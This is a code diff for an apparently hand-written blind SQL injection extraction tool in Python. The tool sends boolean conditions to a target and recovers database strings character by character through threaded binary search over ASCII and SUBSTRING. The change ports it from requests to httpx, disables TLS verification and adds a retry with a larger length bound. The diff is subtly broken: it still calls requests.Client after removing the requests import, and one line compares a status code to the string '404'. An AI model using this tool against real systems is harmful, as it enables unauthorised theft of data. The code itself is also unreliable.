@@ -5,8 +5,6 @@
 
 import sys
 from urllib.parse import quote_plus, quote
-import urllib3
-from urllib3.util import Retry
 import time
 from typing import *
 import logging
@@ -19,14 +17,15 @@ import copy
 import random
 
 try:
-    import requests
+    import urllib3
+    import httpx
     from rich.progress import *
     from prompt_toolkit import prompt, PromptSession
     from prompt_toolkit.history import FileHistory
 except ImportError as e:
     print(e)
     print('Make sure you have the necessary packages:')
-    print('\tpip install requests rich prompt_toolkit')
+    print('\tpip install urllib3 httpx rich prompt_toolkit')
     sys.exit(1)
 
 
@@ -76,9 +75,7 @@ class SQLPayload:
         return self.vector.format_map(FormatMinimal(params))
 
 
-@dataclass
-class ResultError:
-    reason: str
+class ResultError(RuntimeError): pass
 
 
 class ResultParser:
@@ -119,24 +116,15 @@ class BooleanResultParser(ResultParser):
         return resp.status_code != '404'
 
 
-def make_session(max_retries: int, proxy: Optional[str]) -> requests.Session:
-    s = requests.Session()
-    # https://urllib3.readthedocs.io/en/stable/reference/urllib3.util.html#urllib3.util.Retry
-    retries = Retry(
-        connect=max_retries,
-        read=1,
-        redirect=0,
-        backoff_factor=0.2,
+def make_session(max_retries: int, proxy: Optional[str]) -> requests.Client():
+    s = requests.Client(
+        verify=False,
+        transport=httpx.HTTPTransport(
+            retries=max_retries,
+            limits=httpx.Limits(max_connections=100, max_keepalive_connections=100),
+        ),
+        proxy=proxy
     )
-    pool_size = 100
-    adapter = requests.adapters.HTTPAdapter(max_retries=retries, pool_connections=pool_size, pool_maxsize=pool_size)
-    s.mount('http://', adapter)
-    s.mount('https://', adapter)
-    if proxy is not None:
-        s.proxies.update({
-            'http': proxy,
-            'https': proxy
-        })
     return s
 
 
@@ -152,11 +140,11 @@ class Sender:
 
     # Request settings.
     headers: Dict
-    timeout: int = 5
+    timeout: float = 5
     allow_redirects: bool = False
     # keep_alive: bool = False
     
-    session: requests.Session = None
+    session: httpx.Client
     
     retries_on_error: int = 0   # Number of retries if a response was marked as an error.
 
@@ -266,6 +254,13 @@ variant_class = {
 }
 
 
+class BSearchError(Enum):
+    AboveMax = 1
+    BelowMin = 2
+    ErrorMidway = 3
+
+
+
 @dataclass
 class SQLStringBrute:
     sender: Sender
@@ -283,10 +278,10 @@ class SQLStringBrute:
 
         if not self.sender.send(cond=f'{sql}<{max}'):
             # Not even within range?
-            return None
+            return BSearchError.AboveMax
         
         if self.sender.send(cond=f'{sql}<{min}'):
-            return None
+            return BSearchError.BelowMin
 
         while min < max:
             mid = (min + max) // 2
@@ -310,13 +305,12 @@ class SQLStringBrute:
                 min = mid
             # prev = mid
             
-        return None
+        return BSearchError.ErrorMidway
+    
 
-
-    def get_length(self, sql, max_len=2048, *, task=None):
+    def get_length(self, sql, min_len=0, max_len=2048, **kwargs):
         sql = f'{getattr(variant_class[self.dbms], "length")}(({sql}))'
-        return self.get_by_bsearch(sql, 0, max_len, task=task)
-
+        return self.get_by_bsearch(sql, min_len, max_len, **kwargs)
 
     @staticmethod
     def format_bytes(xs: bytes) -> bytes:
@@ -336,18 +330,41 @@ class SQLStringBrute:
             max_len = 2048
             task = self.prog.add_task("[green]measuring...", value=str(max_len), total=int(math.log(max_len, 2)+1))
             try:
-                length = self.get_length(sql, task=task)
+                length = self.get_length(sql, max_len=max_len, task=task)
             except KeyboardInterrupt as e:
                 self.prog.remove_task(task)
                 raise e # Re-raise to exit to main loop.
                
             self.prog.remove_task(task)
 
-        if length is None:
-            logging.warning(f"unable to get length of {sql}")
-            return ''
+        if isinstance(length, BSearchError):
+            if length != BSearchError.AboveMax:
+                logging.warning(f"unable to get length ({length})")
+                return ''
+            
+            logging.warning("unable to get length: retrying with higher upper bound")
 
-        logging.info(f"result length: {length}")
+            with self.prog:
+                min_len = max_len
+                max_len = 64000
+                task = self.prog.add_task("[green]measuring...", value=str(max_len), total=int(math.log(max_len, 2)+1))
+                try:
+                    length = self.get_length(sql, min_len=min_len, max_len=max_len, task=task)
+                except KeyboardInterrupt as e:
+                    self.prog.remove_task(task)
+                    raise e # Re-raise to exit to main loop.
+                
+                self.prog.remove_task(task)
+            
+            if isinstance(length, BSearchError):
+                # Still???
+                logging.warning(f"unable to get length after compensating ({length})")
+                return ''
+
+        logging.info(f"Length: {length}")
+        if length > 5000:
+            logging.warning(f"The deduced length is {length}... that's a lot of chars to get in one go.")
+            logging.warning(f"You may want to hit ^C early to think twice and refine the query.")
 
         result_chars = [b'?'] * length
 
@@ -373,7 +390,13 @@ class SQLStringBrute:
 
                     # Create threads and on-complete handlers.
                     for idx in range(length):
-                        f = executor.submit(self.get_by_bsearch, f"{ASCII}({SUBSTRING}(({sql}),{idx+1},1))", 0, 128, index=idx)
+                        f = executor.submit(
+                                self.get_by_bsearch,
+                                sql=f"{ASCII}({SUBSTRING}(({sql}),{idx+1},1))",
+                                min=0,
+                                max=128,
+                                index=idx,
+                            )
                         f.add_done_callback(lambda f: on_index_finished(task, idx))
                         future_map[f] = idx
 
@@ -387,8 +410,11 @@ class SQLStringBrute:
                             logging.warning(f'{idx} generated an exception: {type(exc)} {exc}')
                         else:
                             if logging.getLogger().getEffectiveLevel() <= logging.INFO:
-                                self.prog.console.log(f"str[{idx}] = {result_chars[idx]} ({ch})")
-                                
+                                if isinstance(ch, ResultError):
+                                    self.prog.console.log(f"str[{idx}] = error ({ch})")
+                                else:
+                                    self.prog.console.log(f"str[{idx}] = {result_chars[idx]} ({ch})")
+
             except KeyboardInterrupt:
                 print('Received KeyboardInterrupt while multi-threading.')
                 print('Cleaning up...')
@@ -409,6 +435,10 @@ class SQLStringBrute:
                
             self.prog.remove_task(task)
 
+        if isinstance(num, BSearchError):
+            logging.warning(f"bsearch error occurred while getting number: {num}")
+            return ''
+        
         return str(num)
 
 
@@ -552,7 +582,7 @@ def main():
     
     parser.add_argument('-X', '--method', choices=["GET", "POST"], default='GET', help='GET or POST')
     parser.add_argument('-H', '--header', action='append', default=[], help='Extra headers to send with requests.')
-    parser.add_argument('--timeout', default=5, type=int, help='Timeout of each request.')
+    parser.add_argument('--timeout', default=5, type=float, help='Timeout of each request.')
     parser.add_argument('--payload', help='The SQLi payload.')
 
     parser.add_argument('--proxy', default=None, help='Send requests to a proxy. Example: http://127.0.0.1:8080.')
@@ -635,7 +665,7 @@ def main():
                 true_if_not_status=args.boolean_false_if_status,  
                 true_if_text_contains=args.boolean_true_if_text_contains,  
                 true_if_text_not_contains=args.boolean_false_if_text_contains,
-                error_if_status=args.boolean_error_if_status,
+                error_if_status=[int(c) for c in args.boolean_error_if_status],
                 error_if_text_contains=args.boolean_error_if_text_contains,
                 error_if_text_not_contains=args.boolean_error_if_text_not_contains,
             )
